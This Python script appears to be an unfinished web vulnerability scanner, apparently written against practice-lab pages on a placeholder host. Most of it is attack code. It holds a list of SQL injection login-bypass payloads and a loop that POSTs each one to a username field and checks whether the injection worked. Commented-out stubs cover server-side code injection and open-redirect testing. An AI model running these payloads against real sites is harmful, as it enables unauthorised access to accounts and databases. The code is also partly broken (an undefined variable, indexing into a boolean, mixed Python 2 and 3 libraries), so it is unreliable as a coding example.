import requests
import difflib, httplib, itertools, optparse, random, re, urllib, urllib2, urlparse

# import ssci
# import oRedirect 

# from sqlalchemy import create_engine
# from sqlalchemy.orm import sessionmaker
# from sqlalchemy import exists
# from sqlalchemy import and_

# valunerability enum
sql_injection = "SQL Injection"
server_injection = "Server Side Code Injection"
directory_traversal = "Directory Traversal"
open_redirect = "Open Redirect"
cross_site_request_forgery = "Cross Site Request Forgery"
shell_command = "Shell Commanf Injection"

payloads = ["' or '1=1","'admin'or 1=1 or ''='", "'=1\' or \'1\' = \'1\'", "'1 'or' 1 '=' 1", "'or 1=1#", "'0 'or' 0 '=' 0", "'admin'or 1=1 or ''='", "'admin' or 1=1", "'admin' or '1'='1", "' or 1=1/*", "' or 1=1--"]


BASE_URL = "http://target.com"

def injectPayload(url, paramname, method, payload, verbose = False):
	#finds index.php at base
	parsedURL = BASE_URL + url	
	html = ""	
	#if get
	if method == "GET":
		getURL = parsedURL + "?" + paramname+"="+payload[0]
		content = requests.get(getURL)
		html =  content.text

	#if post
	elif method == "POST":
		print("POST")
		for payload in payloads:
			print("check payload:{}".format(payload))
			result = requests.post(parsedURL, data={paramname:payload})
			html = result.text
			checkSuccess(html, sql_injection)

	# result = checkSuccess(html, payload[1], content, verbose)
	# if result is not None:
	# 	print payload
	# 	return payload

def checkSuccess(html, attackType):

	if attackType == 'SQL Injection':
		match = re.findall(r'<p>.+', html)
		if match:
			print("Page vulnerable")
		else:
			print("Can not detect...")

	if attackType == "Open Redirect":
		if len(content.history) > 0 and content.url == "https://status.github.com/messages":
			return True

	#server side injection:
	if attackType == "SSCI":
		#included index.php
		indexPHP = requests.get(BASE_URL + "index.php")
		if indexPHP.text in html:
			return attackType
		#uname -a successful:
		if "GNU/Linux" in html:
			return attackType

	return None;
	

if __name__ == "__main__":
	# test sql injection
	url = "/sqli/sqli.php"
	# payloads = scan_page(url)
	# for payload in payloads:
	injectPayload(url, "username", "POST", False)
	'''
	url = "/serverside/eval2.php"
	payloads = ssci.get_all(url)
	for payload in payloads:
		injectPayload(url, "page", "GET", payload)
	'''
	#test for open redirect
	# url = "/openredirect/openredirect.php"
	# orPayload = oRedirect.get_all()
	# for payload in orPayload:
	# 	injectPayload(url, "redirect", "GET", payload)
